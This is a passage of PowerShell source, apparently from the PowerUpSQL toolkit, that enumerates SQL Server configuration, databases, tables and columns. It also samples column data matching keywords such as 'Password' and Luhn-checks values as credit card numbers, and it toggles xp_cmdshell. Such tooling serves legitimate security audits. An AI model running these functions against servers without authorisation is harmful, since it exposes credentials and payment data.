                # Restore xp_cmdshell state if needed                
                if($DisableXpCmdshell -eq 1){
                    
                    Write-Verbose "$Instance : Disabling xp_cmdshell"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Restore Show Advanced Options state if needed                
                if($DisableShowAdvancedOptions -eq 1){
                    
                    Write-Verbose "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose() 

            }catch{

                # Connection failed       
                                 
                if(-not $SuppressVerbose){
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $TblResults.Rows.Add("$ComputerName","$Instance","Not Accessible") | Out-Null
            }                      		
        }         

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                

        return $TblResults
    }
}

# ----------------------------------
#  Get-SQLServerInfo
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerInfo {
<#
    .SYNOPSIS
        Returns basic server and user information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .EXAMPLE
        PS C:\> Get-SQLServerInfo -Instance SQLServer1\STANDARDDEV2014 

        ComputerName           : SQLServer1
        InstanceName           : SQLServer1\STANDARDDEV2014
        DomainName             : Domain
        ServiceName            : MSSQL$STANDARDDEV2014
        ServiceAccount         : LocalSystem
        AuthenticationMode     : Windows and SQL Server Authentication
        Clustered              : No
        SQLServerVersionNumber : 12.0.4213.0
        SQLServerMajorVersion  : 2014
        SQLServerEdition       : Developer Edition (64-bit)
        SQLServerServicePack   : SP1
        OSArchitecture         : X64
        OsMachineType          : WinNT
        OSVersionName          : Windows 8.1 Pro
        OsVersionNumber        : 6.3
        OriginalLogin          : Domain\MyUser
        Currentlogin           : Domain\MyUser
        IsSysadmin             : Yes
        ActiveSessions         : 1
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerInfo -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerInfo = New-Object System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Get number of active sessions for server
        $ActiveSessions =   Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Where-Object {$_.SessionStatus -eq "running"} | Measure-Object -Line | Select-Object Lines -ExpandProperty Lines

        # Get sysadmin status
        $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq "Yes"){
            # Grab additional information if sysadmin
            $SysadminSetup = "
                         -- Get machine type
                        DECLARE @MachineType  SYSNAME
                        EXECUTE master.dbo.xp_regread
                        @rootkey		= N'HKEY_LOCAL_MACHINE',
                        @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                        @value_name		= N'ProductType', 
                        @value			= @MachineType output

                        -- Get OS version
                        DECLARE @ProductName  SYSNAME
                        EXECUTE master.dbo.xp_regread
                        @rootkey		= N'HKEY_LOCAL_MACHINE',
                        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                        @value_name		= N'ProductName', 
                        @value			= @ProductName output"

            $SysadminQuery = "  @MachineType as [OsMachineType],
                                @ProductName as [OSVersionName],"
        }else{
            $SysadminSetup = ""
            $SysadminQuery = ""
        }

        # Define Query
        $Query = "  -- Get SQL Server Information 

                    -- Get SQL Server Service Name and Path 
                    DECLARE @SQLServerInstance varchar(250) 
                    DECLARE @SQLServerServiceName varchar(250) 
                    if @@SERVICENAME = 'MSSQLSERVER'
	                    BEGIN											
		                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                        set @SQLServerServiceName = 'MSSQLSERVER'
	                    END						
                    ELSE
	                    BEGIN
	                    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
                        set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))							
	                    END

                    -- Get SQL Server Service Account 
                    DECLARE @ServiceaccountName varchar(250)  
                    EXECUTE master.dbo.xp_instance_regread  
                    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
                    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

                    -- Get authentication mode
                    DECLARE @AuthenticationMode INT  
                    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', 
                    N'Software\Microsoft\MSSQLServer\MSSQLServer',   
                    N'LoginMode', @AuthenticationMode OUTPUT  

                    -- Grab additional information as sysadmin
                    $SysadminSetup

                    -- Return server and version information
                    SELECT  '$ComputerName' as [ComputerName],
                            @@servername as [InstanceName],
                            DEFAULT_DOMAIN() as [DomainName],                            
                            @SQLServerServiceName as [ServiceName],
                            @ServiceAccountName as [ServiceAccount],
                            (SELECT CASE @AuthenticationMode    
                            WHEN 1 THEN 'Windows Authentication'   
                            WHEN 2 THEN 'Windows and SQL Server Authentication'   
                            ELSE 'Unknown'  
                            END) as [AuthenticationMode],  
                            CASE  SERVERPROPERTY('IsClustered') 
		                            WHEN 0 
		                            THEN 'No'
		                            ELSE 'Yes'
		                            END as [Clustered],
                            SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
                            SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
                            serverproperty('Edition') as [SQLServerEdition],
                            SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
                            SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
                            $SysadminQuery
                            RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
                            ORIGINAL_LOGIN() as [OriginalLogin],
                            SYSTEM_USER as [Currentlogin],
                            '$IsSysadmin' as [IsSysadmin],
                            '$ActiveSessions' as [ActiveSessions]"
        # Execute Query
        $TblServerInfoTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        
        # Append as needed
        $TblServerInfo = $TblServerInfo + $TblServerInfoTemp
    }

    End
    {  
        # Return data
        $TblServerInfo             
    }
}


# ----------------------------------
#  Get-SQLDatabase
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabase {
<#
    .SYNOPSIS
        Returns database information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER NoDefaults
        Only select non default databases.
    .PARAMETER HasAccess
        Only select databases the current user has access to.
    .PARAMETER SysAdminOnly
        Only select databases owned by a sysadmin.
    .EXAMPLE
        PS C:\> Get-SQLDatabase -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

        ComputerName        : SQLServer1
        Instance            : SQLServer1\STANDARDDEV2014
        DatabaseId          : 7
        DatabaseName        : testdb
        DatabaseOwner       : sa
        OwnerIsSysadmin     : 1
        is_trustworthy_on   : True
        is_db_chaining_on   : False
        is_broker_enabled   : True
        is_encrypted        : False
        is_read_only        : False
        create_date         : 4/13/2016 4:27:36 PM
        recovery_model_desc : FULL
        FileName            : C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\DATA\testdb.mdf
        DbSizeMb            : 3.19
        has_dbaccess        : 1
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLDatabase -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Database name.")]
        [string]$DatabaseName,

        [Parameter(Mandatory=$false,
        HelpMessage="Only select non default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Only select databases the current user has access to.")]
        [switch]$HasAccess,

        [Parameter(Mandatory=$false,
        HelpMessage="Only select databases owned by a sysadmin.")]
        [switch]$SysAdminOnly,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable

         # Setup database filter
        if($DatabaseName){
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }else{
            $DatabaseFilter = ""
        }

        # Setup NoDefault filter
        if($NoDefaults){
            $NoDefaultsFilter = " and a.name not in ('master','tempdb','msdb','model')"
        }else{
            $NoDefaultsFilter = ""
        }

        # Setup HasAccess filter
        if($HasAccess){
            $HasAccessFilter = " and HAS_DBACCESS(a.name)=1"
        }else{
            $HasAccessFilter = ""
        }

        # Setup owner is sysadmin filter
        if($SysAdminOnly){
            $SysAdminOnlyFilter = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }else{
            $SysAdminOnlyFilter = ""
        }
    }

    Process
    {    
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }
           
        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            a.database_id as [DatabaseId],
                            a.name as [DatabaseName],
                            SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
                            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],     
	                        a.is_trustworthy_on,
	                        a.is_db_chaining_on,
	                        a.is_broker_enabled,
	                        a.is_encrypted,
	                        a.is_read_only,
	                        a.create_date,
	                        a.recovery_model_desc,
	                        b.filename as [FileName],
                            (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb],
	                        HAS_DBACCESS(a.name) as [has_dbaccess]
                    FROM [sys].[databases] a
                    INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1
                    $DatabaseFilter
                    $NoDefaultsFilter
                    $HasAccessFilter
                    $SysAdminOnlyFilter
                    ORDER BY a.database_id"

        # Execute Query
        if($SuppressVerbose){
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                      
        }else{
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential 
        }

        # Append results for pipeline items
        $TblDatabases = $TblDatabases + $TblResults                        
    }

    End
    {  
        # Return data
        $TblDatabases              
    }
}


# ----------------------------------
#  Get-SQLTable
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLTable {
<#
    .SYNOPSIS
        Returns table information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DatabaseName
        Database name to filter for. 
    .PARAMETER TableName
        Table name to filter for. 
    .PARAMETER NoDefaults
        Filter out results from default databases. 
    .EXAMPLE
        PS C:\> Get-SQLTable -Instance SQLServer1\STANDARDDEV2014 -NoDefaults  -DatabaseName testdb

        ComputerName : SQLServer1
        Instance     : SQLServer1\STANDARDDEV2014
        DatabaseName : testdb
        SchemaName   : dbo
        TableName    : NOCList
        TableType    : BASE TABLE

        ComputerName : SQLServer1
        Instance     : SQLServer1\STANDARDDEV2014
        DatabaseName : testdb
        SchemaName   : dbo
        TableName    : tracking
        TableType    : BASE TABLE
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLTable -Verbose -NoDefaults
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,               
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Database name.")]
        [string]$DatabaseName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Table name.")]
        [string]$TableName,

        [Parameter(Mandatory=$false,
        HelpMessage="Don't select tables from default databases.")]
        [switch]$NoDefaults
    )

    Begin
    {
        $TblTables = new-object System.Data.DataTable
        
        # Setup table filter
        if($TableName){            
            $TableFilter = " where table_name like '%$TableName%'"
        }else{
            $TableFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Setup NoDefault filter
        if($NoDefaults){
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults
        }else{            
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess            
        }

        # Get tables for each database
        $TblDatabases | 
        ForEach-Object {

            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                TABLE_CATALOG AS [DatabaseName],
                                TABLE_SCHEMA AS [SchemaName],
                                TABLE_NAME as [TableName],
                                TABLE_TYPE as [TableType]
                        FROM [$DbName].[INFORMATION_SCHEMA].[TABLES]
                        $TableFilter 
                        ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password

            # Append results 
            $TblTables = $TblTables + $TblResults 
        }        
    }

    End
    {  
        # Return data
        $TblTables              
    }
}


# ----------------------------------
#  Get-SQLColumn
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLColumn {
<#
    .SYNOPSIS
        Returns column information from target SQL Servers. Supports keyword search.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name filter.
    .PARAMETER TableName
        Table name filter. 
    .PARAMETER ColumnName
        Column name filter.
    .PARAMETER ColumnNameSearch
        Column name filter that support wildcards.
    .PARAMETER NoDefaults
        Don't list anything from default databases.
    .EXAMPLE
        PS C:\> Get-SQLColumn -Verbose -Instance "SQLServer1"
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLColumn -Verbose    
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,               
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Database name.")]
        [string]$DatabaseName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Table name.")]
        [string]$TableName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Filter by exact column name.")]
        [string]$ColumnName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Column name using wildcards in search.  Supports comma seperated list.")]
        [string]$ColumnNameSearch,

        [Parameter(Mandatory=$false,
        HelpMessage="Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblColumns = New-Object System.Data.DataTable

        # Setup table filter
        if($TableName){            
            $TableNameFilter = " and TABLE_NAME like '%$TableName%'"
        }else{
            $TableNameFilter = ""
        }

        # Setup column filter
        if($ColumnName){            
            $ColumnFilter = " and column_name like '$ColumnName'"
        }else{
            $ColumnFilter = ""
        }

        # Setup column filter
        if($ColumnNameSearch){            
            $ColumnSearchFilter = " and column_name like '%$ColumnNameSearch%'"
        }else{
            $ColumnSearchFilter = ""
        }

        # Setup column search filter
        if($ColumnNameSearch){
            $Keywords = $ColumnNameSearch.split(",")
            
            [int]$i = $Keywords.Count
            while ($i -gt 0)
            {
                $i = $i - 1
                $Keyword = $Keywords[$i]                

                if($i -eq ($keywords.Count -1)){
                    $ColumnSearchFilter = "and column_name like '%$Keyword%'" 
                }else{
                    $ColumnSearchFilter = $ColumnSearchFilter + " or column_name like '%$Keyword%'" 
                }
            }             
        }   
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

         # Setup NoDefault filter
        if($NoDefaults){
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }else{

            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases | 
        ForEach-Object {

            # Get database name
            $DbName = $_.DatabaseName         

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                TABLE_CATALOG AS [DatabaseName],
		                        TABLE_SCHEMA AS [SchemaName],
		                        TABLE_NAME as [TableName],
		                        COLUMN_NAME as [ColumnName],
		                        DATA_TYPE as [ColumnDataType],
		                        CHARACTER_MAXIMUM_LENGTH as [ColumnMaxLength]
                        FROM	[$DbName].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
                        $ColumnSearchFilter
                        $ColumnFilter
                        $TableNameFilter
                        ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results             
            $TblColumns = $TblColumns + $TblResults
        }        
    }

    End
    {  
        # Return data
        $TblColumns           
    }
}


# ---------------------------------------
# Get-SQLColumnSampleData
# ---------------------------------------
# Author: Scott Sutherland
Function Get-SQLColumnSampleData {
<#
    .SYNOPSIS
        Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER $NoOutput
        Don't output any sample data.
    .PARAMETER SampleSize
        Number of records to sample.
    .PARAMETER Keywords
        Comma seperated list of keywords to search for.
    .PARAMETER $CheckCC
        Use Luhn formula to check if sample is a valid credit card.
    .EXAMPLE
        PS C:\> Get-SQLColumnSampleData -verbose -Instance SQLServer1\STANDARDDEV2014 -Keywords "account,credit,card" -SampleSize 5 -CheckCC | ft -AutoSize
        VERBOSE: SQLServer1\STANDARDDEV2014 : START SEARCH DATA BY COLUMN
        VERBOSE: SQLServer1\STANDARDDEV2014 : CONNECTION SUCCESS
        VERBOSE: SQLServer1\STANDARDDEV2014 : - Searching for column names that match criteria...
        VERBOSE: SQLServer1\STANDARDDEV2014 : - Column match: [testdb].[dbo].[tracking].[card]
        VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
        VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN

        ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC 
        ------------   --------                   -------- ------ -----    ------ ------           -------- ---- 
        SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True 
        SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleData -Keywords "account,credit,card" -SampleSize 5 -ValidateCC
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [string]$NoOutput,       

        [Parameter(Mandatory=$false,
        HelpMessage="Number of records to sample.")]
        [int]$SampleSize = 1,

        [Parameter(Mandatory=$false,
        HelpMessage="Comma seperated list of keywords to search for.")]
        [string]$Keywords = "Password",

        [Parameter(Mandatory=$false,
        HelpMessage="Use Luhn formula to check if sample is a valid credit card.")]
        [switch]$ValidateCC,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {                         
        # Table for output               
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Database") | Out-Null
        $TblData.Columns.Add("Schema") | Out-Null
        $TblData.Columns.Add("Table") | Out-Null
        $TblData.Columns.Add("Column") | Out-Null
        $TblData.Columns.Add("Sample") | Out-Null   
        $TblData.Columns.Add("RowCount") | Out-Null    

        if($CheckCC){
            $TblData.Columns.Add("IsCC") | Out-Null      
        }
    }

    Process
    {   
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){   
            
            if( -not $SuppressVerbose){            
                Write-Verbose "$Instance : CONNECTION FAILED" 
            }                     
            Return
        }else{

            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : START SEARCH DATA BY COLUMN" 
                Write-Verbose "$Instance : - Connection Success."
                Write-Verbose "$Instance : - Searching for column names that match criteria..." 
            }
            
            # Search for columns   
            $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
        }           
        
        # Check if columns were found
        if($Columns){
           
           # List columns found
           $Columns|
           ForEach-Object {    
            
                $DatabaseName = $_.DatabaseName
                $SchemaName = $_.SchemaName
                $TableName = $_.TableName
                $ColumnName = $_.ColumnName
                $AffectedColumn = "[$DatabaseName].[$SchemaName].[$TableName].[$ColumnName]"
                $AffectedTable = "[$DatabaseName].[$SchemaName].[$TableName]"
                $Query = "USE $DatabaseName; SELECT TOP $SampleSize [$ColumnName] FROM $AffectedTable WHERE [$ColumnName] is not null"
                $QueryRowCount = "USE $DatabaseName; SELECT count(CAST([$ColumnName] as VARCHAR(1))) as NumRows FROM $AffectedTable WHERE [$ColumnName] is not null"

                if( -not $SuppressVerbose){

                    Write-Verbose "$Instance : - Column match: $AffectedColumn"                               
                    Write-Verbose "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                }

                # Query for data
                $RowCount = Get-SqlQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object NumRows -ExpandProperty NumRows
                Get-SqlQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose | Select-Object -ExpandProperty $ColumnName |
                ForEach-Object{                                                                                                              
                    if($CheckCC){

                        # Check if value is CC
                        $Value = 0                                                   
                        if([uint64]::TryParse($_,[ref]$Value)){                            
                            $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                        }else{
                            $LuhnCheck = "False"
                        }

                        # Add record
                        $TblData.Rows.Add($ComputerName, $Instance, $DatabaseName, $SchemaName, $TableName, $ColumnName, $_, $RowCount, $LuhnCheck) | Out-Null                                                                        
                    }else{
                        # Add record
                        $TblData.Rows.Add($ComputerName, $Instance, $DatabaseName, $SchemaName, $TableName, $ColumnName, $_, $RowCount) | Out-Null                                                                        
                    }
                }
           }                                          
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : - No columns were found that matched the search."
            }
        } 
                
        # Status User
        if( -not $SuppressVerbose){
            Write-Verbose "$Instance : END SEARCH DATA BY COLUMN" 
        }
    }

    End
    {   
        # Return data  
        if ( -not $NoOutput){            
            Return $TblData      
        }
    }
}


# ----------------------------------
#  Get-SQLDatabaseSchema
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseSchema {
<#
    .SYNOPSIS
        Returns schema information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
